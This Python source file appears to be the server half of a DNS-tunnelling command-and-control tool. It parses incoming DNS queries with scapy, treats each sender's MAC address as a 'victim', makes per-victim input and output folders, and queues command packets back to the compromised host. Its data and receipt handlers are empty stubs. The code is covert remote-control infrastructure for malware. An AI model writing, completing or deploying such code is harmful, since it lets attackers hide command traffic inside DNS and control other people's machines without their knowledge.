"""Process a given packet
"""
import os

from scapy.all import *
from utils.request_type import RequestType
from command.cmdparser import CommandParser

class DataReceiver():

    def __init__(self, rel_path, cmd_file, queue):
        self.cmd_parser = CommandParser()
        self.rel_path = rel_path
        self.cmd_file = cmd_file
        self.queue = queue

    def parse(self, pkt):
        # Check qtype field to delineate type of given packet
        if pkt.getlayer(DNSQR).qtype == RequestType.PING:
            self._receive_ping(pkt)
        elif pkt.getlayer(DNSQR).qtype == RequestType.DATA:
            self._receive_data(pkt)
        elif pkt.getlayer(DNSQR).qtype == RequestType.RECPT:
            self._receive_recpt(pkt)

    def _receive_ping(self, pkt):
        # Fetch given command that should be sent to the client
        print('ping')
        victim_mac = pkt.getlayer(Ether).src

        # If client connecting for first time, create new dir for it
        victim_dir = self.rel_path + victim_mac
        if not os.path.exists(victim_dir):
            self._init_victim_dir(victim_dir)

        pkts = self.cmd_parser.parse(victim_mac, pkt, victim_dir, self.cmd_file)

        # Send packets back to victim
        self.queue.enqueue(pkts)

    def _receive_data(self, pkt):
        print('receive_data')

    def _receive_recpt(self, pkt):
        print('receipt')


    def _init_victim_dir(self, victim_dir):
        os.mkdir(victim_dir)
        os.mkdir(victim_dir + '/input')
        os.mkdir(victim_dir + '/output')